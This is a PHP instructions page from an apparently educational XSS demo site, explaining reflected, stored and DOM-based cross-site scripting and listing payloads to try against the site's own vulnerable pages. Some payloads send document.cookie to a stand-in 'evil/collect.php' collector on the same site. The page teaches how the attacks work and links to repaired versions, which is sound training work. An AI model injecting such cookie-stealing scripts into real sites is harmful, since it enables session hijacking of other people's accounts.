<?php // attacks/index.php
require($_SERVER['DOCUMENT_ROOT'] . '/../config/config.inc.php');
include(TEMPLATES . 'headerstandard.php');
$reflected_exploit3 = "<script>var xhr=new XMLHttpRequest();xhr.open('POST','" . BASE_URL .  "evil/collect.php',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('data='.concat('Reflected YourMessageHere'));</script>";
$stored_exploit3 = '<script>new Image().src="' . BASE_URL . 'evil/collect.php?data=Stored YourMessageHere";</script>';
$dombased_exploit4 = '<script>new Image().src="' . BASE_URL . 'evil/collect.php?data=DomBased YourMessageHere";</script>';
$reflected_exploit4 = "<script>var xhr=new XMLHttpRequest();xhr.open('POST','" . BASE_URL .  "evil/collect.php',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('data='.concat(document.cookie));</script>";
$stored_exploit4 = '<script>new Image().src="' . BASE_URL . 'evil/collect.php?data="+document.cookie;</script>';
$dombased_exploit5 = "<script>var xhr=new XMLHttpRequest();xhr.open('POST','" . BASE_URL .  "evil/collect.php',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('data='.concat(document.cookie));</script>";
?>
        <div class="row px-4 py-5 my-5 justify-content-center">
          <h1 class="display-5 fw-bold text-center">Instructions</h1>
        </div>
        <div class="row">
          <div class="col-lg-4 border border-right-0 border-1">
            <div class="row">
              <div class="col-lg-12">
                <div class="h2"><a href="/attacks/reflected.php" class="link-primary">Reflected</a></div>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-12">
                <div class="text-secondary">
                  A reflected XSS vulnerability takes direct input from the user of the web page and displays, or reflects, that input back to the user. For example, on the reflect.php page, submitting a search term executes a GET request to search the <em>comments</em> database table for teh search term. When the search is executed, if there are no results found, the page displays a message that includes the submitted search term. The page is vulnerable to XSS because it does not sanitize the input. As a result, any HTML included with the search term will be rendered as part of the page, including any <span class="fw-bold"><?= htmlEntities('<script></script>', ENT_QUOTES); ?></span> tags, which will be executed when the page loads. This allows an attacker to include malicious javascript code in the form submission (or directly in the address bar as part of the query term "?search="). Try these search term submissions to exploit this vulnerability:
                </div>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                1.
              </div>
              <div class="col-lg-10 text-break">
                it
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                2.
              </div>
              <div class="col-lg-10 text-break">
                it<?= htmlEntities("<script>alert('This page has been hacked!')</script>", ENT_QUOTES); ?>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                3.
              </div>
              <div class="col-lg-10 text-break">
                it<?= htmlEntities($reflected_exploit3, ENT_QUOTES); ?>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                4.
              </div>
              <div class="col-lg-10 text-break">
                it<?= htmlEntities($reflected_exploit4, ENT_QUOTES); ?>
              </div>
            </div>
          </div>
          <div class="col-lg-4 border border-right-0 border-1">
            <div class="row">
              <div class="col-lg-12">
                <div class="h2"><a href="/attacks/stored.php" class="link-primary">Stored</a></div>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-12">
                <div class="text-secondary">
                  A stored XSS vulnerability is similar to a refected XSS vulnerability in that unsanitized user input is rendered with the page's HTML code, including potentially malicious javascript code. However, the stored vulnerability differs in that the user input is persistently stored on the server, such as in a database. In this example, user input is received in the form of comments on a message board. The comments are stored (unsanitized) and then rendered whenever the page is loaded. On this page, the current number of results (data sent to a 'malicious' server using the vulnerability) is displayed below the 'Name' field. Note that any malicious javascript stored in the database will be executed after the page loads the comments, which means any successful results will be updated after the page load. So, after you've made a successful exploit and sent something to the 'evil' server (just another page on the site that updates a results table in the database), load the page again, click the <i class="bi bi-arrow-clockwise"></i> Refresh button and compare the results to the number under the 'Name' field. Try entering these comments to exploit this vulnerability:
                </div>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                1.
              </div>
              <div class="col-lg-10 text-break">
                This is a safe comment. Nothing bad here.
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                2.
              </div>
              <div class="col-lg-10 text-break">
                A great comment!<?= htmlEntities("<script>alert('This page has been hacked!')</script>", ENT_QUOTES); ?>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                3.
              </div>
              <div class="col-lg-10 text-break">
                Nothing to see here<?= htmlEntities($stored_exploit3, ENT_QUOTES); ?>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                4.
              </div>
              <div class="col-lg-10 text-break">
                Safest Comment Ever<?= htmlEntities($stored_exploit4, ENT_QUOTES); ?>
              </div>
            </div>
          </div>
          <div class="col-lg-4 border border-1">
            <div class="row">
              <div class="col-lg-12">
                <div class="h2"><a href="/attacks/dombased.php" class="link-primary">DOM-Based</a></div>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-12">
                <div class="text-secondary">
                  A DOM-Based XSS vulnerability is very similar to a reflected vulnerability: it takes direct input from the user of the web page and displays that input back to the user. However, there is a key difference: in a DOM-based vulnerability, the input is used for client-side dynamic content (javascript changing the page), rather than a dynamic page created server-side as in the reflected vulnerability. As a result, if executed properly, the server may not even be able to detect the exploit. Try using these addresses to exploit this vulnerability (be sure to compare the URL seen by the server to the URL in the address bar):
                </div>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                1.
              </div>
              <div class="col-lg-10 text-break">
                <?= htmlEntities(BASE_URL . "/attacks/dombased.php?name=YourName", ENT_QUOTES); ?>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                2.
              </div>
              <div class="col-lg-10 text-break">
                <?= htmlEntities(BASE_URL . "/attacks/dombased.php#name=YourName", ENT_QUOTES); ?>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                3.
              </div>
              <div class="col-lg-10 text-break">
                <?= htmlEntities(BASE_URL . "/attacks/dombased.php?name=YourName<script>alert('This page has been hacked!')</script>", ENT_QUOTES); ?>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                4.
              </div>
              <div class="col-lg-10 text-break">
                <?= htmlEntities(BASE_URL . "/attacks/dombased.php?name=YourName" . $dombased_exploit4, ENT_QUOTES); ?>
              </div>
            </div>
            <div class="row">
              <div class="col-lg-2">
                5.
              </div>
              <div class="col-lg-10 text-break">
                <?= htmlEntities(BASE_URL . "/attacks/dombased.php#name=YourName" . $dombased_exploit5, ENT_QUOTES); ?>
              </div>
            </div>
          </div>
        </div>
        <div class="row justify-content-center my-2">
          <div class="col-lg-auto text-center">
            <a class="btn btn-primary" href="/attacks/" role="button"><i class="bi bi-fire"></i> Attacks</a>
          </div>
          <div class="col-lg-auto text-center">
            <a class="btn btn-primary" href="/repaired/" role="button">Repaired <i class="bi bi-tools"></i></a>
          </div>
          <div class="col-lg-auto text-center">
            <a class="btn btn-primary" href="/evil/" role="button">Results <i class="bi bi-arrow-right-circle-fill"></i></a>
          </div>
        </div>
<?php
include(TEMPLATES . 'footerstandard.php');
?>
